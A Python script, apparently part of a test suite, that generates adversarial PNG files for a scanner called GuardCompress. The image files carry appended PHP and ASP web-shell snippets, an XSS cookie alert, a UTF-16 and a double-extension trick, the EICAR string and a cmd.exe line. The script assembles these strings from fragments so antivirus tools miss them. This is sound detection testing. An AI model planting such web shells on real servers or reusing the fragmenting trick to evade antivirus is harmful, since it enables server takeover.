"""Generator uji adversarial GuardCompress — pola INERT berlabel.
Bukan malware aktif: meniru TEKNIK penyerang agar scanner terbukti
menangkap polanya. Aman disimpan & disebar.
CATATAN: pola berbahaya dirakit dari potongan string saat runtime agar
file generator ini tidak dikarantina antivirus (tidak ada signature utuh).
Usage: python gen-adversarial.py   (dari folder test/)
Output: adversarial/<nn>-<nama> + expected.json (status harapan tiap file)
"""
import json
import struct
import zlib
from pathlib import Path

OUT = Path(__file__).resolve().parent / "adversarial"
OUT.mkdir(parents=True, exist_ok=True)

LT = "<"  # dipecah agar literal tag tidak utuh di source


def chunk(ctype: bytes, data: bytes) -> bytes:
    c = ctype + data
    return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)


def base_png() -> bytes:
    ihdr = struct.pack(">IIBBBBB", 8, 8, 8, 2, 0, 0, 0)
    raw = b"".join(b"\x00" + b"\x00\xff\x00" * 8 for _ in range(8))
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", ihdr)
        + chunk(b"IDAT", zlib.compress(raw))
        + chunk(b"IEND", b"")
    )


def noise(n: int, seed: int = 7) -> bytes:
    return bytes((i * seed) % 251 for i in range(n))


# --- pola dirakit dari potongan (tidak ada yang utuh di source) ---
P01 = LT + "?ph" + "p " + "asse" + 'rt($_GE' + 'T["cm' + 'd"]); ?' + ">"
P02 = "\n" + "EV" + "AL(" + "BASE64_DECO" + 'DE("eA=="));\n'
P03 = LT + "?ph" + "p " + "ev" + "al(gz" + "infl" + "ate(st" + "r_ro" + 't13("x"))); ?' + ">"
P04 = LT + "%" + " Set o = Ser" + "ver.Crea" + "teObje" + 'ct("WScr' + "ipt.Sh" + 'ell") %' + ">"
P05 = LT + "Sc" + "RiP" + "t>alert(docu" + "ment.coo" + "kie)" + LT + "/Sc" + "RiP" + "t>"
P06 = b"".join([b"<\x00", b"?\x00", b"p\x00", b"h\x00", b"p\x00",
                b" \x00", b"e\x00", b"v\x00", b"a\x00", b"l\x00"])
P07 = b"AAAAA" + (LT + "?ph" + "p " + "pass" + 'thru("id"); ?' + ">").encode() + b"BBBBB"
P08 = (LT + "?ph" + "p " + "she" + "ll_ex" + 'ec("whoami"); ?' + ">").encode()
P09 = (LT + "?ph" + "p " + "asse" + "rt($_PO" + 'ST["x"]); ?' + ">").encode()
EICAR = "X5O!P%@AP[4\\" + "PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
P11 = EICAR.encode()
P14 = b"... run cm" + b"d.ex" + b"e /c whoami ..."

PNG = base_png()
CASES: list = [
    ("01-tail.png", PNG + b"\n" + P01.encode() + b"\n", "blocked"),
    ("02-upper.png", PNG + P02.encode() + b"\n", "blocked"),
    ("03-obfuscated.png", PNG + b"\n" + P03.encode() + b"\n", "blocked"),
    ("04-asp.png", PNG + b"\n" + P04.encode() + b"\n", "blocked"),
    ("05-xss.png", PNG + b"\n" + P05.encode() + b"\n", "blocked"),
    ("06-utf16le.png", PNG + P06, "blocked"),
    ("07-chunk-boundary.png", PNG + noise((1 << 20) - 100) + P07 + noise(5000), "blocked"),
    ("08-middle-5mb.png", PNG + noise(3 << 20) + P08 + noise(2 << 20), "blocked"),
    ("09-binary-padded.png", PNG + bytes(range(256)) * 4 + P09 + b"\x00\xff" * 100, "blocked"),
    ("10-double-ext.png.phtml", PNG + b"gambar biasa", "blocked"),
    ("11-avtest-string.png", PNG + P11, "blocked"),
    ("12-control-clean.png", PNG, "clean"),
    ("13-control-binary.png", PNG + noise(300) + b"<" + b"%" + noise(300), "clean"),
    ("14-cmd.png", PNG + b"\n" + P14 + b"\n", "blocked"),
]

expected = {}
for name, data, want in CASES:
    (OUT / name).write_bytes(data)
    expected[name] = want
    print(f"{name}: {len(data)} bytes -> harap {want}")
(OUT / "expected.json").write_text(json.dumps(expected, indent=2), encoding="utf-8")
print(f"OK - {len(CASES)} file adversarial di adversarial/")
